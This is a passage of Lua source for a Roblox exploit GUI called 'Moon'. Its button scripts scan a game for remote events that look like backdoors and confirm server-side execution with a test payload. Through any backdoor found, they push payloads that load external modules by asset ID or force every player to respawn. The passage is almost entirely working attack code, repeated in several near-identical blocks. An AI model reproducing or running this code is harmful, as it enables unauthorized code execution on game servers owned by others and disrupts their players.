		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(6608656220):John(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_87);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_91()
	local script = G2L["91"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7804327506).amigodogodenot123(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_91);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_9b()
	local script = G2L["9b"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7163976217).VK(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_9b);
-- StarterGui.ScreenGui.Hub.RE.LocalScript
local function C_aa()
	local script = G2L["aa"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}



		local player = game.Players.LocalPlayer
		local payloading = [[
		for _, lol in pairs(game.Players:GetPlayers()) do
			lol:LoadCharacter()
		end
		]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_aa);
-- StarterGui.ScreenGui.LocalScript
local function C_ac()
	local script = G2L["ac"];
	local ownerid = 8167967082


	game.Players.PlayerAdded:Connect(function(player)
		if player.UserID == ownerid then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Moon",
				Text = "Omg Moon Owner joined !!!. "..player.Name,
				Icon = "rbxassetid://7395824155",
				Duration = 10,
			})
		end
	end)
end;
task.spawn(C_ac);

return G2L["1"], require;
